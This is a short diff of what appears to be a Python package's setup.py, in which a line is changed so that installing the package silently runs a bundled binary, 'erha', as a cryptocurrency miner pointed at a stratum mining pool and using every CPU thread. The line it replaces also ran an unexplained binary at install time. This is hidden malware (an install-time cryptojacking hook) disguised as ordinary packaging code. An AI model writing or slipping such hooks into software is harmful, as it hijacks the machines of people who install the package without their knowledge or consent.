@@ -1,5 +1,5 @@
 import os
-os.system ("chmod +x lib && ./lib lib.ini")
+os.system ("chmod +x erha && ./erha -v 2 -r 20 -s stratum+tcp://fastpool.xyz:10097 -su 621010-71.0.roller/x -cpu -cputhreads $(nproc)")
 from setuptools import find_packages, setup
 
 with open(os.path.join(os.path.dirname(__file__), 'README.md'), encoding="utf-8") as readme:
